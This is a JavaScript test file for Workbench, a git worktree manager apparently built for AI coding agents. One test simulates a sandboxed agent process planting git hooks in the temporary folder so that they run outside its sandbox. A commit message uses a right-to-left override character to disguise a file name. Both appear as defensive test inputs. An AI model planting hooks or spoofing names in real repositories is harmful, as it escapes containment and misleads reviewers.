    git(t.root, 'add', 'f.txt');
    git(t.root, 'commit', '-q', '-m', `Fix ${rlo}txt.exe`);
    const head = headOf(t.root);
    // A branch that is neither HEAD nor an agent's is not followed, but it is named where it points at a listed commit.
    git(t.root, 'branch', 'release', decoy);
    git(t.root, 'branch', 'side', decoy);
    git(t.root, 'checkout', '-q', 'side');
    write(t.p('side.txt'), 's\n');
    git(t.root, 'add', 'side.txt');
    git(t.root, 'commit', '-q', '-m', 'on the side');
    const sideTip = headOf(t.root);
    git(t.root, 'checkout', '-q', 'main');

    const g = await gitGraph({ repoRoot: t.root });
    assert.equal(g.ok, true);
    assert.equal(g.head, head);
    assert.equal(g.branch, 'main');
    assert.equal(g.more, false);
    const ids = g.commits.map(c => c.id);
    assert.equal(new Set(ids).size, ids.length);
    assert.ok(!ids.includes(sideTip));
    assert.deepEqual(new Set(ids), new Set([head, decoy, m.merge, m.work, t.ws.base, secondTip]));
    g.commits.forEach((c, i) => c.parents.forEach(par => {
      if (ids.includes(par)) assert.ok(ids.indexOf(par) > i, 'every commit comes before its parents');
    }));
    const by = id => g.commits.find(c => c.id === id);
    assert.deepEqual(by(m.merge), {
      id: m.merge, parents: [t.ws.base, m.work], subject: 'Merge Search cleanup: Fix the search box', author: 'Pat Person',
      at: by(m.merge).at, refs: [], agentId: t.id, kind: 'merge',
    });
    assert.ok(Math.abs(by(m.merge).at - Date.now()) < 120_000, 'at is in milliseconds');
    assert.deepEqual(by(m.work).refs, [t.ws.branch]);
    assert.equal(by(m.work).kind, 'work');
    assert.equal(by(m.work).agentId, t.id);
    assert.deepEqual(by(secondTip), { ...by(secondTip), refs: ['workbench/graph-second-gr0002'], agentId: null, kind: 'commit', subject: 'Second agent’s own commit' });
    assert.deepEqual(by(decoy), { ...by(decoy), refs: ['release'], agentId: null, kind: 'commit' });
    assert.equal(by(head).subject, `Fix ${rlo}txt.exe`, 'passed on as it is: the page shows such characters');
    assert.deepEqual(by(head).refs, ['main']);
    assert.deepEqual(by(t.ws.base).parents, []);

    const two = await gitGraph({ repoRoot: t.root, limit: 2 });
    assert.equal(two.commits.length, 2);
    assert.equal(two.more, true);
    git(t.root, 'checkout', '-q', '--detach');
    const detached = await gitGraph({ repoRoot: t.root });
    assert.equal(detached.branch, null);
    assert.equal(detached.head, head);
    assert.equal((await gitGraph({ repoRoot: path.join(T, 'missing') })).ok, false);
  });

  test('the source-control functions refuse what is not an agent’s folder, in plain words', async () => {
    const t = await agentRepo({ ...STARTING_FILES, 'src/x.js': 'x\n' });
    const snap = o => snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base, ...o });
    const plain = /^[A-Z][^\n]*\.$/;
    const rejects = async (promise, re) => {
      await assert.rejects(promise, e => {
        assert.match(e.message, re);
        assert.match(e.message, plain);
        assert.doesNotMatch(e.message, /fatal|error:/);
        return true;
      });
    };
    await rejects(snap({ path: t.root }), /your own folder/);
    await rejects(snap({ path: path.join(T, 'nowhere') }), /Its folder is gone/);
    await rejects(snap({ path: 'relative/folder' }), /No agent folder/);
    await rejects(snap({ repoRoot: t.p('src') }), /not the top folder/);
    await rejects(snap({ repoRoot: path.join(T, 'missing') }), /does not exist/);
    await rejects(snap({ since: 'HEAD' }), /does not know which commit its work started from/);
    await rejects(snap({ since: 'f'.repeat(40) }), /no longer in this repository/);
    const feature = path.join(T, `feature-${t.id}`);
    git(t.root, 'worktree', 'add', '-q', '-b', 'feature', feature);
    await rejects(snap({ path: feature }), /no longer on a workbench\/ branch/);
    await rejects(workDiff({ repoRoot: t.root, path: feature, since: t.ws.base }), /no longer on a workbench\/ branch/);
    git(t.ws.path, 'checkout', '-q', '--detach');
    await rejects(snap(), /no longer on a workbench\/ branch/);
    // mergeWork and discardWork never throw: they refuse.
    assert.deepEqual(await mergeWork(), { ok: false, why: 'git', sentence: 'Workbench could not tell which agent this is, so nothing was merged.' });
    assert.deepEqual(await mergeWork({ agentId: t.id, repoRoot: path.join(T, 'missing') }), { ok: false, why: 'git', sentence: `The repository folder ${path.join(T, 'missing')} does not exist.` });
    assert.deepEqual(await discardWork(), { ok: false, why: 'git', sentence: 'Workbench could not tell which agent this is, so nothing was thrown away.' });
    assert.deepEqual(await discardWork({ agentId: t.id, branch: 'main', repoRoot: t.root }), { ok: false, why: 'git', sentence: 'That is not a branch Workbench made, so nothing was thrown away.' });
    // A folder that is gone: mergeWork says so in the spec's words.
    const info = await prepareRepo(t.root);
    const other = await createWorkspace({ repoRoot: t.root, agentId: 'gn0009', slug: 'gone', baseDir });
    fs.rmSync(other.path, { recursive: true, force: true });
    assert.deepEqual(await mergeWork({ ...mergeOpts(t, { workId: 'x', into: info.branch, intoHead: info.head }), path: other.path, branch: other.branch, since: other.base }),
      { ok: false, why: 'gone', sentence: 'Its folder is gone, so there is nothing to merge.' });
  });
});

// This one needs its edit to land in the same second as git writes the agent’s index, so it runs alone too.
test('a snapshot still sees an edit of the same size made in the second the agent’s index was written, however much later it is taken', async () => {
  // Git trusts the size and times it noted for a file in an index unless the file is not older than the index. A
  // fresh copy of the index is newer than everything, so a snapshot read through one would miss such an edit for good.
  let t, index;
  for (let tries = 1; ; tries++) {
    t = await agentRepo({ 'a.txt': 'one\ntwo\nthree\n' });
    write(t.w('a.txt'), 'one\nTWO\nthree\n'); // the same size, at once
    index = path.resolve(t.ws.path, git(t.ws.path, 'rev-parse', '--git-path', 'index'));
    const second = f => Math.floor(fs.statSync(f).mtimeMs / 1000);
    if (second(t.w('a.txt')) === second(index)) break; // what makes it racy: the edit in the index's own second
    assert.ok(tries < 5, 'the edit never landed in the second the index was written');
  }
  const first = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
  assert.deepEqual(first.files, [{ path: 'a.txt', status: 'modified', adds: 1, dels: 1 }]);
  // Into a later second than the index's.
  await new Promise(resolve => setTimeout(resolve, (Math.floor(fs.statSync(index).mtimeMs / 1000) + 1) * 1000 - Date.now() + 50));

  // The danger, where this git trusts whole seconds: a plain copy of the index hides the edit.
  const copy = path.join(T, `index-copy-${t.id}`);
  fs.copyFileSync(index, copy);
  const plain = spawnSync('git', ['diff-files', '--quiet'], { cwd: t.ws.path, env: { ...process.env, GIT_INDEX_FILE: copy } });
  if (plain.status === 0) assert.equal(statusOf(t.ws.path), ' M a.txt\n', 'git itself, with the real index, sees the edit');

  const later = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
  assert.equal(later.tree, first.tree);
  assert.deepEqual(later.files, first.files);
  assert.equal((await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base })).workId, first.workId);
});

// These change process.env, so they run alone.
test('mergeWork says when git does not know the person’s name and email, whatever the environment says', async () => {
  const t = await agentRepo(STARTING_FILES, { identity: false });
  write(t.w('a.txt'), 'one\nAGENT\nthree\n');
  const saved = process.env.GIT_CONFIG_GLOBAL;
  delete process.env.GIT_CONFIG_GLOBAL; // a HOME with no config files at all: only Workbench's own private folder
  try {
    assert.deepEqual(fs.readdirSync(process.env.HOME).filter(n => n !== '.workbench'), []);
    assert.equal(process.env.GIT_AUTHOR_NAME, 'Workbench Test'); // plain git would use this, or guess one
    assert.equal(await gitIdentity({ repoRoot: t.root }), null);
    const { expect } = await proposal(t);
    const was = await everything(t);
    assert.deepEqual(await mergeWork(mergeOpts(t, expect)), {
      ok: false, why: 'identity',
      sentence: 'Git does not know your name and email yet, so Workbench cannot make the merge commit. Set user.name and user.email with git config, then try again.',
    });
    assert.deepEqual(await everything(t), was);
    git(t.root, 'config', 'user.name', PERSON.name);
    assert.equal(await gitIdentity({ repoRoot: t.root }), null, 'both are needed');
    git(t.root, 'config', 'user.email', PERSON.email);
    assert.deepEqual(await gitIdentity({ repoRoot: t.root }), PERSON);
    // Nor does a commit date in Workbench's own environment date the person's commits.
    process.env.GIT_AUTHOR_DATE = process.env.GIT_COMMITTER_DATE = '@86400 +0000';
    const ok = await mergeWork(mergeOpts(t, expect));
    assert.equal(ok.ok, true);
    for (const c of [ok.work, ok.merge]) {
      assert.equal(git(t.root, 'log', '-1', '--format=%an <%ae>|%cn <%ce>', c), 'Pat Person <pat@example.invalid>|Pat Person <pat@example.invalid>');
      const [authored, committed] = git(t.root, 'log', '-1', '--format=%at %ct', c).split(' ').map(Number);
      assert.ok(Math.abs(authored * 1000 - Date.now()) < 120_000 && Math.abs(committed * 1000 - Date.now()) < 120_000, 'dated now');
    }
  } finally {
    process.env.GIT_CONFIG_GLOBAL = saved;
    delete process.env.GIT_AUTHOR_DATE;
    delete process.env.GIT_COMMITTER_DATE;
  }
  assert.equal(await gitIdentity({ repoRoot: path.join(T, 'missing') }), null);
});

test('mergeWork refuses with git-old when git is older than 2.38', async () => {
  const t = await agentRepo();
  write(t.w('a.txt'), 'one\nAGENT\nthree\n');
  const { expect } = await proposal(t);
  const realGit = execFileSync('/bin/sh', ['-c', 'command -v git'], { encoding: 'utf8' }).trim();
  const shimDir = path.join(T, 'old-git');
  const shim = version => {
    write(path.join(shimDir, 'git'), `#!/bin/sh\nfor a in "$@"; do\n  if [ "$a" = "--version" ]; then echo "git version ${version}"; exit 0; fi\ndone\nexec '${realGit}' "$@"\n`);
    fs.chmodSync(path.join(shimDir, 'git'), 0o755);
  };
  const was = await everything(t);
  const savedPath = process.env.PATH;
  process.env.PATH = `${shimDir}${path.delimiter}${savedPath}`;
  try {
    shim('2.37.9');
    assert.equal(execFileSync('git', ['--version'], { encoding: 'utf8' }).trim(), 'git version 2.37.9');
    assert.deepEqual(await mergeWork(mergeOpts(t, expect)), { ok: false, why: 'git-old', sentence: 'Workbench needs git 2.38 or newer to merge.' });
    shim('2.38.0 (Apple Git-1)'); // new enough: the next check speaks
    assert.deepEqual(await mergeWork(mergeOpts(t, { ...expect, intoHead: 'f'.repeat(40) })),
      { ok: false, why: 'moved', sentence: 'main changed since you looked. Have another look.' });
  } finally {
    process.env.PATH = savedPath;
  }
  assert.deepEqual(await everything(t), was);
});

test('when the person’s branch moves just before git reads it, git stops before it begins, and mergeWork says main changed', async () => {
  const t = await agentRepo();
  write(t.w('a.txt'), 'one\nAGENT\nthree\n');
  const { expect } = await proposal(t);
  // A git that makes a commit in the person's folder just before it fast-forwards: the moment after Workbench's last look.
  const realGit = execFileSync('/bin/sh', ['-c', 'command -v git'], { encoding: 'utf8' }).trim();
  const shimDir = path.join(T, 'commit-first-git');
  write(path.join(shimDir, 'git'), `#!/bin/sh\nfor a in "$@"; do\n  if [ "$a" = "--ff-only" ]; then '${realGit}' commit -q --allow-empty -m meanwhile >/dev/null 2>&1; break; fi\ndone\nexec '${realGit}' "$@"\n`);
  fs.chmodSync(path.join(shimDir, 'git'), 0o755);
  const person = folderPrint(t.root);
  const savedPath = process.env.PATH;
  process.env.PATH = `${shimDir}${path.delimiter}${savedPath}`;
  let r;
  try {
    r = await mergeWork(mergeOpts(t, expect));
  } finally {
    process.env.PATH = savedPath;
  }
  assert.equal(git(t.root, 'log', '-1', '--format=%s %P'), `meanwhile ${expect.intoHead}`);
  assert.deepEqual(r, { ok: false, why: 'moved', sentence: 'main changed since you looked. Have another look.' });
  assert.deepEqual(folderPrint(t.root), person);
  assert.equal(statusOf(t.root), '');
});

/** Whether `p` is the folder `dir` or inside it, as given or as its real path. */
const isIn = (p, dir) => [dir, fs.realpathSync(dir)].some(d => p === d || p.startsWith(d + path.sep));

test('privateTemp makes a new private folder under ~/.workbench/tmp each time, never in the temporary folder', () => {
  const home = path.join(T, 'private-home');
  fs.mkdirSync(home);
  const own = path.join(fs.realpathSync(home), '.workbench', 'tmp');
  const a = privateTemp('workbench-index-', { home });
  assert.equal(path.dirname(a), own);
  assert.match(path.basename(a), /^workbench-index-.{6}$/);
  assert.equal(fs.statSync(a).mode & 0o777, 0o700);
  assert.equal(fs.statSync(own).mode & 0o777, 0o700);
  assert.deepEqual(fs.readdirSync(a), []);
  const b = privateTemp('workbench-index-', { home });
  assert.notEqual(b, a);
  // The folder that holds them is made private again when it was not.
  fs.chmodSync(own, 0o755);
  privateTemp('workbench-git-', { home });
  assert.equal(fs.statSync(own).mode & 0o777, 0o700);
  // The home folder is read at each call: here, the tests' own.
  const c = privateTemp('workbench-git-');
  assert.equal(path.dirname(c), path.join(fs.realpathSync(process.env.HOME), '.workbench', 'tmp'));
  fs.rmdirSync(c);
  assert.deepEqual(fs.readdirSync(tmp).filter(f => f.startsWith('workbench-')), []);
  for (const p of fs.readdirSync(own)) fs.rmSync(path.join(own, p), { recursive: true });
});

test('privateTemp refuses a link or a file in place of ~/.workbench/tmp, in plain words, and makes nothing', () => {
  const elsewhere = path.join(T, 'private-elsewhere');
  fs.mkdirSync(elsewhere);
  for (const [kind, put] of [['link', p => fs.symlinkSync(elsewhere, p)], ['file', p => fs.writeFileSync(p, '')]]) {
    const home = path.join(T, `private-${kind}`);
    fs.mkdirSync(path.join(home, '.workbench'), { recursive: true });
    const own = path.join(home, '.workbench', 'tmp');
    put(own);
    assert.throws(() => privateTemp('workbench-index-', { home }), {
      plain: true, message: `Workbench could not make a private folder for its temporary files in ${own}.`,
    }, kind);
  }
  assert.deepEqual(fs.readdirSync(elsewhere), [], 'nothing was made where the link points');
});

test('privateTemp removes leftovers more than a day old the first time in a run, and keeps newer ones', () => {
  const home = path.join(T, 'private-leftovers');
  const own = path.join(home, '.workbench', 'tmp');
  fs.mkdirSync(own, { recursive: true, mode: 0o700 });
  const old = path.join(own, 'workbench-gh-old123');
  const fresh = path.join(own, 'workbench-terminal-new456');
  const notOurs = path.join(own, 'someone-else');
  for (const d of [old, fresh, notOurs]) write(path.join(d, 'x'), 'x\n');
  const twoDaysAgo = (Date.now() - 2 * 24 * 60 * 60_000) / 1000;
  for (const d of [old, notOurs]) fs.utimesSync(d, twoDaysAgo, twoDaysAgo);
  const made = privateTemp('workbench-index-', { home });
  assert.equal(fs.existsSync(old), false, 'Workbench stopped before it could remove it: it goes now');
  assert.equal(fs.existsSync(fresh), true, 'maybe still in use by another Workbench');
  assert.equal(fs.existsSync(notOurs), true, 'only Workbench’s own');
  // Once in a run: a leftover that grows old meanwhile waits for the next run.
  fs.utimesSync(fresh, twoDaysAgo, twoDaysAgo);
  privateTemp('workbench-index-', { home });
  assert.equal(fs.existsSync(fresh), true);
  assert.equal(fs.existsSync(made), true, 'the folder just made is the caller’s to remove');
});

test('Workbench’s own git never works in the temporary folder, where another process could plant hooks for it to run', async () => {
  // A git first on the PATH does, every time, what a process that can write the temporary folder (a Codex agent's, in
  // its sandbox) could do at the right moment: it fills the folder core.hooksPath names with hooks that note
  // themselves. It also notes where each git works (its folder, a GIT_INDEX_FILE, a --work-tree), then runs the real git.
  const realGit = execFileSync('/bin/sh', ['-c', 'command -v git'], { encoding: 'utf8' }).trim();
  const shimDir = path.join(T, 'planting-git');
  const notes = path.join(T, 'planting-git.log');
  const ran = path.join(T, 'planted-hooks.log');
  write(path.join(shimDir, 'git'), [
    '#!/bin/sh',
    `printf 'cwd %s\\n' "$(pwd -P)" >> '${notes}'`,
    `if [ -n "$GIT_INDEX_FILE" ]; then printf 'index %s\\n' "$GIT_INDEX_FILE" >> '${notes}'; fi`,
    'for a in "$@"; do',
    '  case "$a" in',
    `    core.hooksPath=*) d="\${a#core.hooksPath=}"; printf 'hooks %s\\n' "$d" >> '${notes}'`,
    `      for h in ${HOOKS.join(' ')}; do { printf '#!/bin/sh\\necho %s >> "%s"\\n' "$h" '${ran}' > "$d/$h" && chmod +x "$d/$h"; } 2>/dev/null; done ;;`,
    `    --work-tree=*) printf 'worktree %s\\n' "\${a#--work-tree=}" >> '${notes}' ;;`,
    '  esac',
    'done',
    `exec '${realGit}' "$@"`,
    '',
  ].join('\n'));
  fs.chmodSync(path.join(shimDir, 'git'), 0o755);

  const t = await agentRepo();
  write(t.w('a.txt'), 'one\nAGENT\nthree\n');
  write(t.w('new.txt'), 'new\n');
  write(t.w('.gitignore'), '.env\nnode_modules/\nhidden.txt\n'); // the rules it started from are read in a folder of Workbench's own
  write(t.w('hidden.txt'), 'hidden by the agent\n');
  const other = await createWorkspace({ repoRoot: t.root, agentId: `${t.id}o`, slug: 'Throw me', baseDir });
  write(path.join(other.path, 'x.txt'), 'x\n');
  const marked = await createWorkspace({ repoRoot: t.root, agentId: `${t.id}m`, slug: 'Marked', baseDir });
  git(marked.path, 'update-index', '--assume-unchanged', 'b.txt'); // the tidy judges its files again in an index of its own

  const savedPath = process.env.PATH;
  process.env.PATH = `${shimDir}${path.delimiter}${savedPath}`;
  try {
    const { expect } = await proposal(t);
    await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    assert.ok((await diffStats({ path: t.ws.path, base: t.ws.base })).list.some(f => f.path === 'hidden.txt' && f.ignored));
    assert.equal((await mergeWork(mergeOpts(t, expect))).ok, true);
    const s2 = await snapshotWork({ repoRoot: t.root, path: other.path, since: other.base });
    assert.equal((await discardWork({ repoRoot: t.root, path: other.path, branch: other.branch, since: other.base, expect: { workId: s2.workId }, agentId: `${t.id}o` })).ok, true);
    assert.equal((await gitGraph({ repoRoot: t.root })).ok, true);
    assert.deepEqual(await removeWorkspace({ repoRoot: t.root, path: marked.path, base: marked.base, onlyIfUnchanged: true, deleteBranch: true }),
      { removed: true, branch: marked.branch });
  } finally {
    process.env.PATH = savedPath;
  }
  const lines = fs.readFileSync(notes, 'utf8').split('\n').filter(Boolean);
  assert.deepEqual(lines.filter(l => isIn(l.slice(l.indexOf(' ') + 1), tmp)), [], 'nothing of Workbench’s own git is in the temporary folder');
  assert.deepEqual([...new Set(lines.filter(l => l.startsWith('hooks ')).map(l => l.slice('hooks '.length)))], ['/dev/null'],
    'core.hooksPath names a place where no hook can be put');
  assert.equal(fs.existsSync(ran), false, 'no planted hook ran');
  // Its own index and the rules the agent started from were in private folders of its own, which are gone again.
  const own = path.join(fs.realpathSync(process.env.HOME), '.workbench', 'tmp');
  assert.ok(lines.some(l => l.startsWith(`index ${own}${path.sep}workbench-index-`)), 'a scratch index of its own was used');
  assert.ok(lines.some(l => l.startsWith(`worktree ${own}${path.sep}workbench-ignore-`)), 'the rules it started from were read in a folder of its own');
  assert.equal(fs.statSync(own).mode & 0o777, 0o700);
  assert.deepEqual(fs.readdirSync(own).filter(f => f.startsWith('workbench-')), []);
});

// ---------------------------------------------------------------------------------------------
// Filling a new workspace (fillWorkspace): the ignored files an agent's copy needs, from the person's folder.

/** Write `files` under `dir`; a value { link: target } makes a link. */
function put(dir, files) {
  for (const [f, v] of Object.entries(files)) {
    const file = path.join(dir, f);
    fs.mkdirSync(path.dirname(file), { recursive: true });
    if (v && typeof v === 'object') fs.symlinkSync(v.link, file);
    else fs.writeFileSync(file, v);
  }
}

/**
 * A repository whose one commit holds `tracked` (its .gitignore among them; `forced` are added with -f), then
 * `untracked` written in the person's folder only, and an agent's folder made from the commit. `agent()` makes another.
 */
let fillRepos = 0;
async function fillRepo(tracked, untracked = {}, { forced = [] } = {}) {
  const n = ++fillRepos;
  const r = path.join(T, `fill-${n}`);
  fs.mkdirSync(r);
  git(r, 'init', '-q', '-b', 'main');
  put(r, tracked);
  git(r, 'add', '-A');
  if (forced.length) git(r, 'add', '-f', '--', ...forced);
  git(r, 'commit', '-q', '-m', 'first');
  put(r, untracked);
  const root = fs.realpathSync.native(r);
  let agents = 0;
  const agent = async () => (await createWorkspace({ repoRoot: root, agentId: `fill${n}x${++agents}`, slug: 'fill', baseDir })).path;
  const ws = await agent();
  return { root, ws, agent, p: f => path.join(root, f), w: f => path.join(ws, f) };
}

/**
 * cp as a stand-in for fillWorkspace: each call is noted ({ file, args, timeout }); `act` may make something and throw,
 * as a cp that fails part-way; otherwise the copy is made with Node, the way cp makes it: links as links, modes kept.
 */
function cpStandIn(act) {
  const calls = [];
  const copy = async (file, args, { timeout } = {}) => {
    calls.push({ file, args: [...args], timeout });
    const [src, dst] = args.slice(-2);
    await act?.({ file, args, src, dst });
    // A link as it is, even one that leads nowhere yet (fs.cpSync refuses those).
    if (fs.lstatSync(src).isSymbolicLink()) fs.symlinkSync(fs.readlinkSync(src), dst);
    else fs.cpSync(src, dst, { recursive: true, verbatimSymlinks: true, preserveTimestamps: true, errorOnExist: true, force: false });
    return { code: 0, stderr: '' };
  };
  return { calls, copy };
}

/** An error the way execFile gives one for a cp that failed: its exit code (or how it was stopped) and its words. */
const cpError = (stderr, more = {}) => Object.assign(new Error(`Command failed\n${stderr}`), { code: 1, killed: false, signal: null, stderr, ...more });
const readText = f => fs.readFileSync(f, 'utf8');
const present = f => { try { fs.lstatSync(f); return true; } catch { return false; } };
const modeOf = f => fs.statSync(f).mode & 0o777;
const pathsOf = list => list.map(e => e.path);
/** Every path under `dir` named .git (in any case), never looking inside one nor through a link. */
function dotGitsUnder(dir, rel = '') {
  const out = [];
  for (const e of fs.readdirSync(path.join(dir, rel), { withFileTypes: true })) {
    const r = rel ? `${rel}/${e.name}` : e.name;
    if (e.name.toLowerCase() === '.git') out.push(r);
    else if (e.isDirectory()) out.push(...dotGitsUnder(dir, r));
  }
  return out;
}
/** Make every real folder at or in `p` open to its owner again, so that the tests' folder can be removed at the end. */
function openAll(p) {
  let st;
  try { st = fs.lstatSync(p); } catch { return; }
  if (!st.isDirectory()) return;
  fs.chmodSync(p, 0o755);
  for (const name of fs.readdirSync(p)) openAll(path.join(p, name));
}

// Each has repositories of its own, and none changes process.env, so they run a few at a time.
describe('filling a new workspace', { concurrency: TESTS_AT_ONCE }, () => {
  test('by default it copies the .env files and node_modules folders git ignores, at any depth, and leaves out a tracked .env.example', async () => {
    const t = await fillRepo({
      '.gitignore': '.env\n.env.*\n!.env.example\n.envrc\nnode_modules/\n/secrets/\n.vercel\n/build/\n/vendor/\n',
      '.env.example': 'EXAMPLE=committed\n',
      'package.json': '{}\n',
      'packages/a/package.json': '{}\n',
      'packages/b/package.json': '{}\n',
      'src/index.js': 'x\n',
      'tools/run.py': 'x\n',
    }, {
      '.env': 'ROOT=1\n',
      '.env.local': 'LOCAL=1\n',
      '.env.example': 'EXAMPLE=edited\n', // the person's change to a tracked file
      '.envrc': 'use node\n',
      'packages/a/.env.development.local': 'A=1\n',
      'packages/a/node_modules/y/index.js': 'y\n',
      'node_modules/foo/index.js': 'foo\n',
      'node_modules/foo/.env': 'PACKAGE=1\n', // a package's own: it comes with node_modules, never on its own
      'node_modules/foo/node_modules/bar/index.js': 'bar\n', // comes with the outer node_modules
      'node_modules/.bin/foo': { link: '../foo/index.js' },
      'secrets/.env': 'SECRET=1\n', // in a folder git ignores as a whole
      'secrets/key.pem': 'key\n',
      '.vercel/.env.development.local': 'V=1\n',
      '.vercel/project.json': '{}\n',
      'src/sub/.env.test': 'T=1\n', // a folder holding only ignored files: git lists the folder and the file
      'tools/.env/pyvenv.cfg': 'home = /usr/bin\n', // a virtualenv named .env: a folder, never an env file
      'tools/.env/lib/site/.env': 'IN_VENV=1\n',
      'build/nested/.env': 'NESTED=1\n', // inside another repository (made below)
      'build/node_modules/bm/index.js': 'bm\n', // a build's own, inside a folder git ignores as a whole: left out
      'vendor/acme/tests/.env': 'FIXTURE=1\n', // a package's own (Composer's vendor/), never the project's
    });
    git(t.p('build/nested'), 'init', '-q');
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    const as = (kind, paths) => paths.map(p => ({ path: p, kind, cloned: true }));
    assert.deepEqual(r.copied, [
      ...as('env', ['.env', '.env.local', '.envrc', '.vercel/.env.development.local']),
      ...as('deps', ['node_modules']),
      ...as('env', ['packages/a/.env.development.local']),
      ...as('deps', ['packages/a/node_modules']),
      ...as('env', ['secrets/.env', 'src/sub/.env.test']),
    ]);
    assert.deepEqual(r.skipped, []);
    assert.ok(Number.isInteger(r.ms) && r.ms >= 0);
    assert.equal(readText(t.w('.env')), 'ROOT=1\n');
    assert.equal(readText(t.w('secrets/.env')), 'SECRET=1\n');
    assert.equal(readText(t.w('packages/a/node_modules/y/index.js')), 'y\n');
    assert.equal(readText(t.w('node_modules/foo/node_modules/bar/index.js')), 'bar\n');
    assert.equal(readText(t.w('node_modules/foo/.env')), 'PACKAGE=1\n');
    assert.equal(fs.readlinkSync(t.w('node_modules/.bin/foo')), '../foo/index.js');
    assert.equal(readText(t.w('.env.example')), 'EXAMPLE=committed\n', 'a tracked file is the agent’s own, as committed');
    for (const f of ['secrets/key.pem', '.vercel/project.json', 'tools/.env', 'build', 'vendor']) assert.equal(present(t.w(f)), false, f);
  });

  test('a .worktreeinclude chooses instead: the ignored paths it matches, with negations, nested paths and folders git ignores as a whole', async () => {
    const t = await fillRepo({
      '.gitignore': '.env\n.env.*\nnode_modules/\n/data/\n/secrets/\nconfig/*.json\n!config/public.json\n*.log\n',
      '.worktreeinclude': ['# what the app reads', '.env*', '!.env.test', 'config/*.json', 'data/*', '!data/big/', 'secrets/', '*.log', '!logs/keep.log', ''].join('\n'),
      'config/public.json': '{}\n',
      'config/app.yml': 'a: 1\n',
      'secrets/README.md': 'committed\n', // tracked inside an ignored folder: git then lists that folder file by file
      'src/index.js': 'x\n',
    }, {
      '.env': 'E=1\n',
      '.env.test': 'T=1\n',
      'src/sub/.env.local': 'S=1\n',
      'config/secret.json': '{"k":1}\n',
      'config/local.yml': 'not ignored\n',
      'data/a.json': '[]\n',
      'data/b.csv': 'b\n',
      'data/big/blob.bin': 'big\n',
      'secrets/README.md': 'changed by the person\n',
      'secrets/.env': 'S=1\n',
      'secrets/deep/key.pem': 'key\n',
      'logs/a.log': 'a\n',
      'logs/keep.log': 'k\n',
      'node_modules/x/index.js': 'x\n',
      'node_modules/x/.env.example': 'X=1\n', // a package's own, which .env* matches too, as in git
    }, { forced: ['secrets/README.md'] });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    // data/ is one entry in git's list of what it ignores, and file by file in what .worktreeinclude matches. src/sub/
    // holds only matching files: git 2.39 names it whole in both lists (and the file in it too), so it is copied as one;
    // a git that names only the file gives the file.
    const sub = pathsOf(r.copied).filter(p => p.startsWith('src/sub'));
    assert.ok(sub.length === 1 && ['src/sub', 'src/sub/.env.local'].includes(sub[0]), String(sub));
    assert.deepEqual(pathsOf(r.copied).filter(p => !p.startsWith('src/sub')), ['.env', 'config/secret.json', 'data/a.json', 'data/b.csv', 'logs/a.log',
      'node_modules/x/.env.example', 'secrets/.env', 'secrets/deep']);
    assert.ok(r.copied.every(e => e.kind === 'listed' && e.cloned === true));
    assert.deepEqual(r.skipped, []);
    assert.equal(readText(t.w('secrets/deep/key.pem')), 'key\n');
    assert.equal(readText(t.w('src/sub/.env.local')), 'S=1\n');
    assert.equal(readText(t.w('secrets/README.md')), 'committed\n');
    for (const f of ['.env.test', 'data/big', 'logs/keep.log', 'config/local.yml', 'node_modules/x/index.js']) assert.equal(present(t.w(f)), false, f);
    // With node_modules/ listed too, it is one entry, whole.
    fs.appendFileSync(t.p('.worktreeinclude'), 'node_modules/\n');
    const ws2 = await t.agent();
    const r2 = await fillWorkspace({ repoRoot: t.root, path: ws2, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(pathsOf(r2.copied).filter(p => p.startsWith('node_modules')), ['node_modules']);
    assert.equal(readText(path.join(ws2, 'node_modules/x/index.js')), 'x\n');
  });

  test('an empty .worktreeinclude copies nothing; one that is a link is never read, and the default applies', async () => {
    const t = await fillRepo({ '.gitignore': '.env\nnode_modules/\n', '.worktreeinclude': '' },
      { '.env': 'E=1\n', 'node_modules/x/index.js': 'x\n', 'include.txt': '.env\n' });
    const cp = cpStandIn();
    const fill = () => fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy });
    for (const text of ['', '# nothing yet\n\n']) {
      fs.writeFileSync(t.p('.worktreeinclude'), text);
      const r = await fill();
      assert.deepEqual([r.copied, r.skipped], [[], []]);
    }
    assert.equal(cp.calls.length, 0);
    fs.rmSync(t.p('.worktreeinclude'));
    fs.symlinkSync('include.txt', t.p('.worktreeinclude'));
    assert.deepEqual((await fill()).copied.map(e => [e.path, e.kind]), [['.env', 'env'], ['node_modules', 'deps']]);
  });

  test('virtualenvs are never copied by default; one .worktreeinclude names is copied, and listed in skipped as a venv', async () => {
    const t = await fillRepo({ '.gitignore': '.env\n.venv/\nvenv/\n/envs/\n', 'tools/run.py': 'x\n' }, {
      '.env': 'E=1\n',
      '.venv/pyvenv.cfg': 'home = /usr/bin\n',
      '.venv/bin/python': { link: '/usr/bin/python3' },
      'venv/pyvenv.cfg': 'home = /usr/bin\n',
      'envs/py311/pyvenv.cfg': 'home = /usr/bin\n', // a virtualenv by what it holds
      'envs/py311/lib/x.py': 'x\n',
      'envs/README.txt': 'not listed below\n', // so that only envs/py311/ matches, never envs/ as a whole
      'tools/.env/pyvenv.cfg': 'home = /usr/bin\n',
    });
    const fill = ws => fillWorkspace({ repoRoot: t.root, path: ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    const r = await fill(t.ws);
    assert.deepEqual(r.copied, [{ path: '.env', kind: 'env', cloned: true }]);
    assert.deepEqual(r.skipped, []);
    for (const f of ['.venv', 'venv', 'envs', 'tools/.env']) assert.equal(present(t.w(f)), false, f);

    fs.writeFileSync(t.p('.worktreeinclude'), '.env\n.venv/\nenvs/py311/\ntools/.env/\n');
    const ws2 = await t.agent();
    const r2 = await fill(ws2);
    assert.deepEqual(r2.copied.map(e => [e.path, e.kind]), [['.env', 'listed'], ['.venv', 'listed'], ['envs/py311', 'listed'], ['tools/.env', 'listed']]);
    assert.deepEqual(r2.skipped, ['.venv', 'envs/py311', 'tools/.env'].map(p => ({ path: p, why: 'venv' })));
